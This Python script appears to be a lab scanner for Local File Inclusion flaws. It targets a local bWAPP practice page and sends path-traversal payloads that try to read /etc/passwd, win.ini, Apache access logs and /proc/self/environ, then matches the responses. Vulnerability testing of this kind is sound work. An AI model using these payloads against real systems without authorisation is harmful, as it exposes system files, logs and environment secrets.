import requests
import re
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def create_session():
    """
    Creates and configures a requests session with retry logic and custom headers.

    Args:
        None

    Returns:
        requests.Session: A configured session object.
    """
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
    return session

def send_request(session, url, payload):
    """
    Sends a GET request with the given payload to the specified URL using the provided session.

    Args:
        session (requests.Session): The session to use for making the request.
        url (str): The URL to send the request to.
        payload (str): The payload to include in the request.

    Returns:
        str: The response text from the server, or an empty string if the request fails.
    """
    try:
        response = session.get(f"{url}?{payload}")
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response.text
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return ""

def advanced_lfi_detection(url):
    """
    Detects Local File Inclusion (LFI) vulnerabilities by testing common payloads.

    Args:
        url (str): The URL to test for LFI vulnerabilities.

    Returns:
        tuple: A tuple containing a boolean indicating if an LFI vulnerability was found,
               and a string message with the details.
    """
    session = create_session()
    payloads = [
        {"name": "etc/passwd", "payload": "file=../../../../etc/passwd", "response": "root:x:0:0:"},
        {"name": "windows/win.ini", "payload": "file=../../../../windows/win.ini", "response": "[fonts]"},
        {"name": "apache/logs", "payload": "file=../../../../var/log/apache2/access.log", "response": "GET /"},
        {"name": "proc/self/environ", "payload": "file=../../../../proc/self/environ", "response": "USER="}
    ]

    for item in payloads:
        name = item.get('name')
        payload = item.get('payload')
        response_pattern = item.get('response')

        response = send_request(session, url, payload)
        if re.search(response_pattern, response):
            message = f"URL is vulnerable to {name} attack\nUsed payload: {payload}"
            print(message)
            return True, message
    return False, "No LFI vulnerabilities detected."

def main():
    url_lfi = "http://localhost/bWAPP/rlfi.php"
    
    vulnerabilities_found, description = advanced_lfi_detection(url_lfi)
    if vulnerabilities_found:
        print(f"{url_lfi} is vulnerable to LFI")
    else:
        print(f"{url_lfi} is not vulnerable to LFI")
    print(description)

if __name__ == "__main__":
    main()
